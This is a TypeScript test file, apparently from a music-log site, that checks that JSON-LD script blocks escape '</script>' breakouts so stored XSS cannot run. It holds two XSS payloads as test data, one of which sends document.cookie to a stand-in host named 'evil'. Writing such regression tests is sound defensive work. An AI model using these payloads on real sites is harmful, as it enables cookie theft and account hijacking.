import { describe, expect, it } from "vitest";
import { serializeJsonLd } from "@/lib/json-ld";
import { Route as HomeRoute } from "./index";
import { Route as LogRoute } from "./log.$logId";

// The stored-XSS regression guard for the JSON-LD emitters.
//
// JSON-LD blocks are emitted through a route `head().scripts` entry, whose
// string `children` TanStack renders RAW via dangerouslySetInnerHTML. Plain
// `JSON.stringify` does NOT neutralize `</script>`, so a `</script>` in a
// Spotify-sourced title / artist / album, or the operator note woven into the
// log description, used to break out of the inline <script> and execute (there
// is no CSP). Every emitter now serializes through `jsonLdScript`, which escapes
// `< > & U+2028 U+2029` to their `\uXXXX` JSON forms — neutralizing the breakout
// while leaving the payload valid JSON-LD a parser still reads.
//
// We assert on the exact `children` string the route head produces (what reaches
// the inline <script>), so the test mirrors the rendered SSR output.

type HeadScript = { children: string; type: string };
type HeadResult = { meta?: Array<Record<string, unknown>>; scripts?: Array<HeadScript> };

function ldChildren(head: HeadResult): Array<string> {
  return (head.scripts ?? [])
    .filter((script) => script.type === "application/ld+json")
    .map((script) => script.children);
}

const PAYLOAD = "Tune</script><img src=x onerror=alert(document.cookie)>";

describe("jsonLdScript (serializeJsonLd)", () => {
  it("escapes the </script> breakout chars but round-trips to the same JSON", () => {
    const jsonLd = { "@type": "Thing", name: PAYLOAD };
    const rendered = serializeJsonLd(jsonLd);

    expect(rendered).not.toContain("</script>");
    expect(rendered).not.toContain("<");
    expect(rendered).not.toContain(">");
    expect(rendered).toContain("\\u003c/script\\u003e");
    // Still valid JSON-LD: it parses back to the identical object.
    expect(JSON.parse(rendered)).toEqual(jsonLd);
  });

  it("escapes the U+2028/U+2029 line separators", () => {
    const rendered = serializeJsonLd({ name: "a b c" });

    expect(rendered).toContain("\\u2028");
    expect(rendered).toContain("\\u2029");
    expect(rendered).not.toContain(" ");
    expect(rendered).not.toContain(" ");
  });
});

describe("JSON-LD output encoding (stored-XSS guard)", () => {
  it("homepage MusicPlaylist neutralizes a </script> in a track title/artist/album", () => {
    const loaderData = {
      totalCount: 1,
      tracks: [
        {
          album: PAYLOAD,
          artists: [PAYLOAD],
          spotifyUrl: "https://open.spotify.com/track/abc",
          title: PAYLOAD,
          type: "track",
        },
      ],
    } as never;

    const head = HomeRoute.options.head?.({ loaderData } as never) as HeadResult;
    const playlist = ldChildren(head).find((c) => c.includes("MusicPlaylist"));

    expect(playlist).toBeDefined();
    // No raw breakout survives into the inline <script>…
    expect(playlist).not.toContain("</script>");
    expect(playlist).toContain("\\u003c/script\\u003e");
    // …but the data is intact: it parses back and carries the original payload.
    const parsed = JSON.parse(playlist as string) as {
      track: Array<{ inAlbum: { name: string }; name: string }>;
    };
    expect(parsed.track[0].name).toBe(PAYLOAD);
    expect(parsed.track[0].inAlbum.name).toBe(PAYLOAD);
  });

  it("log page MusicRecording neutralizes a </script> in the title and the operator note", () => {
    const evilNote = 'Banger</script><script>fetch("//evil/"+document.cookie)</script>';
    const track = {
      addedAt: "2026-06-03T18:21:00.000Z",
      album: "Some Album",
      artists: ["Axwell"],
      bpm: 172,
      durationMs: 215_000,
      key: "F major",
      label: "Some Label",
      logId: "004.7.2I",
      note: evilNote,
      spotifyUrl: "https://open.spotify.com/track/abc",
      title: PAYLOAD,
      trackId: "abc",
      updatedAt: "2026-06-04T00:00:00.000Z",
    };
    const loaderData = { related: [], status: "found", track } as never;

    const head = LogRoute.options.head?.({ loaderData } as never) as HeadResult;
    const recording = ldChildren(head).find((c) => c.includes("MusicRecording"));

    expect(recording).toBeDefined();
    // Neither the title (name) nor the note (woven into the description) leaves a
    // raw breakout in the rendered inline <script>.
    expect(recording).not.toContain("</script>");
    expect(recording).toContain("\\u003c/script\\u003e");

    const parsed = JSON.parse(recording as string) as { description: string; name: string };
    expect(parsed.name).toBe(PAYLOAD);
    expect(parsed.description).toContain(evilNote);
  });
});
